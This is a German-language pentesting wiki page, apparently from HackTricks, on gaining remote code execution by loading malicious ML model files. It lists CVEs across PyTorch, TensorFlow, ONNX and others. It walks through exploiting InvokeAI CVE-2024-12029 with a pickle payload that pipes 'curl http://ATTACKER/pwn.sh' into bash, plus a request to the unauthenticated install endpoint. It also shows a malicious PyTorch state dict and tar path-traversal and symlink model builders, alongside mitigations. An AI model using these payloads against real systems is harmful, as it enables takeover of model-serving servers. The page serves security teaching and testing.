# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Laden von Modellen zu RCE

Machine Learning-Modelle werden normalerweise in verschiedenen Formaten geteilt, wie ONNX, TensorFlow, PyTorch usw. Diese Modelle k√∂nnen auf den Maschinen der Entwickler oder in Produktionssystemen geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen sch√§dlichen Code enthalten, aber es gibt einige F√§lle, in denen das Modell verwendet werden kann, um beliebigen Code auf dem System auszuf√ºhren, entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells.

Zum Zeitpunkt des Schreibens sind dies einige Beispiele f√ºr diese Art von Schwachstellen:

| **Framework / Tool**        | **Schwachstelle (CVE, falls verf√ºgbar)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schadhafter Pickle im Modell-Checkpoint f√ºhrt zur Codeausf√ºhrung (Umgehung der `weights_only`-Sicherung)                                | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + schadhafter Modell-Download verursacht Codeausf√ºhrung; Java-Deserialisierungs-RCE in der Verwaltungs-API                          | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden des Modells aus YAML verwendet `yaml.unsafe_load` (Codeausf√ºhrung) <br> Laden des Modells mit **Lambda**-Schicht f√ºhrt zur Ausf√ºhrung beliebigen Python-Codes | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ausgel√∂stes `.tflite`-Modell verursacht ganzzahlige √úberl√§ufe ‚Üí Heap-Korruption (potenzielles RCE)                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells √ºber `joblib.load` f√ºhrt zur Ausf√ºhrung von Pickle mit dem Payload des Angreifers `__reduce__`                       | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                          | `numpy.load` erlaubte standardm√§√üig pickled Objektarrays ‚Äì schadhafter `.npy/.npz`-Datei f√ºhrt zur Codeausf√ºhrung                        | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnisdurchquerung) <br> **CVE-2024-5187** (tar-Durchquerung)                                        | Der externe Gewichts-Pfad des ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Schadhafter ONNX-Modell-Tar kann beliebige Dateien √ºberschreiben (f√ºhrt zu RCE) | |
| ONNX Runtime (Designrisiko) | *(Keine CVE)* ONNX benutzerdefinierte Operationen / Kontrollfluss                                                              | Modell mit benutzerdefiniertem Operator erfordert das Laden des nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuf√ºhren | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Durchquerung)                                                                                       | Verwendung der Modell-Lade-API mit aktiviertem `--model-control` erm√∂glicht relative Pfad-Durchquerung zum Schreiben von Dateien (z. B. √úberschreiben von `.bashrc` f√ºr RCE) | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (mehrere Heap-√úberl√§ufe)                                                                           | Fehlformatierte GGUF-Modell-Datei verursacht Heap-Puffer√ºberl√§ufe im Parser, was die Ausf√ºhrung beliebigen Codes auf dem Opfersystem erm√∂glicht | |
| **Keras (√§ltere Formate)**  | *(Keine neue CVE)* Legacy Keras H5-Modell                                                                                     | Schadhafter HDF5 (`.h5`) Modell mit Lambda-Schicht-Code wird beim Laden weiterhin ausgef√ºhrt (Keras safe_mode deckt das alte Format nicht ab ‚Äì ‚ÄûDowngrade-Angriff‚Äú) | |
| **Andere** (allgemein)      | *Designfehler* ‚Äì Pickle-Serialisierung                                                                                       | Viele ML-Tools (z. B. pickle-basierte Modellformate, Python `pickle.load`) f√ºhren beliebigen Code aus, der in Modell-Dateien eingebettet ist, es sei denn, es gibt Abhilfema√ünahmen | |

Dar√ºber hinaus gibt es einige auf Python-Pickle basierende Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die verwendet werden k√∂nnen, um beliebigen Code auf dem System auszuf√ºhren, wenn sie nicht mit `weights_only=True` geladen werden. Daher k√∂nnte jedes auf Pickle basierende Modell besonders anf√§llig f√ºr diese Art von Angriffen sein, auch wenn sie nicht in der obigen Tabelle aufgef√ºhrt sind.

### üÜï  InvokeAI RCE √ºber `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Webschnittstelle f√ºr Stable-Diffusion. Die Versionen **5.3.1 ‚Äì 5.4.2** exponieren den REST-Endpunkt `/api/v2/models/install`, der es Benutzern erm√∂glicht, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der Endpunkt schlie√ülich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch-Checkpoint (`*.ckpt`)** ist, f√ºhrt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der benutzerkontrollierten URL stammt, kann ein Angreifer ein b√∂sartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode im Checkpoint einbetten; die Methode wird **w√§hrend der Deserialisierung** ausgef√ºhrt, was zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server f√ºhrt.

Die Schwachstelle wurde mit **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) bewertet.

#### Ausbeutungsdurchgang

1. Erstellen Sie einen b√∂sartigen Checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hoste `payload.ckpt` auf einem HTTP-Server, den du kontrollierst (z.B. `http://ATTACKER/payload.ckpt`).
3. Trigger den verwundbaren Endpunkt (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterl√§dt, wird `torch.load()` aufgerufen ‚Üí das `os.system` Gadget wird ausgef√ºhrt und der Angreifer erh√§lt Codeausf√ºhrung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: **Metasploit** Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

‚Ä¢  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardm√§√üig **false**)  
‚Ä¢  `/api/v2/models/install` vom Angreifer erreichbar  
‚Ä¢  Prozess hat Berechtigungen zur Ausf√ºhrung von Shell-Befehlen  

#### Minderung

* Upgrade auf **InvokeAI ‚â• 5.4.3** ‚Äì der Patch setzt `scan=True` standardm√§√üig und f√ºhrt eine Malware-√úberpr√ºfung vor der Deserialisierung durch.  
* Verwenden Sie beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) Helfer.  
* Erzwingen Sie Erlauben-Listen / Signaturen f√ºr Modellquellen und f√ºhren Sie den Dienst mit minimalen Rechten aus.  

> ‚ö†Ô∏è Denken Sie daran, dass **jede** Python-Pickle-basierte Format (einschlie√ülich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) von Natur aus unsicher ist, um von nicht vertrauensw√ºrdigen Quellen deserialisiert zu werden.  

---

Beispiel f√ºr eine ad-hoc Minderung, wenn Sie √§ltere InvokeAI-Versionen hinter einem Reverse-Proxy betreiben m√ºssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Beispiel ‚Äì Erstellen eines b√∂sartigen PyTorch-Modells

- Erstellen Sie das Modell:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Lade das Modell:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelle zu Pfad Traversierung

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die meisten Modellformate, die von verschiedenen KI-Frameworks verwendet werden, auf Archiven, normalerweise `.zip`. Daher k√∂nnte es m√∂glich sein, diese Formate auszunutzen, um Pfad Traversierungsangriffe durchzuf√ºhren, die es erm√∂glichen, beliebige Dateien vom System zu lesen, auf dem das Modell geladen wird.

Zum Beispiel k√∂nnen Sie mit dem folgenden Code ein Modell erstellen, das eine Datei im Verzeichnis `/tmp` erstellt, wenn es geladen wird:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder, mit dem folgenden Code k√∂nnen Sie ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras Deserialisierung und Gadget-Suche

F√ºr einen fokussierten Leitfaden zu .keras-Interna, Lambda-Layer RCE, dem Problem mit dem willk√ºrlichen Import in ‚â§ 3.8 und der Entdeckung von Post-Fix-Gadgets innerhalb der Allowlist, siehe:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec Blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialisierung von nicht vertrauensw√ºrdigen Daten"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI Patch Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit Modul Dokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì Sicherheits√ºberlegungen f√ºr torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
